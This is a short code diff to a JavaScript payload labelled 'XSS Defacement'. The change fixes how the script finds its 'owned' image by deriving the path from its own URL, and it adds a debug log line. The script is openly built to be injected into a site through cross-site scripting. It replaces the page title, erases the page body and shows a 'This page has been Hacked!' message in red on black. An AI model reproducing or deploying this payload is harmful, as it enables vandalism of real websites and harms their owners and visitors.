@@ -5,13 +5,16 @@
 
 var title = "XSS Defacement";
 var bgcolor = "#000000";
-var image_url = "./stallowned.jpg";
+var image_url = document.currentScript.src.replace(/\/[^/]+$/, "/stallowned.jpg");
 var text = "This page has been Hacked!";
 var font_color = "#FF0000";
 
 deface(title, bgcolor, image_url, text, font_color);
 
 function deface(pageTitle, bgColor, imageUrl, pageText, fontColor) {
+	
+	console.log(">>>" + document.currentScript.src);
+	
 	document.title = pageTitle;
 	document.body.innerHTML = '';
 	document.bgColor = bgColor;
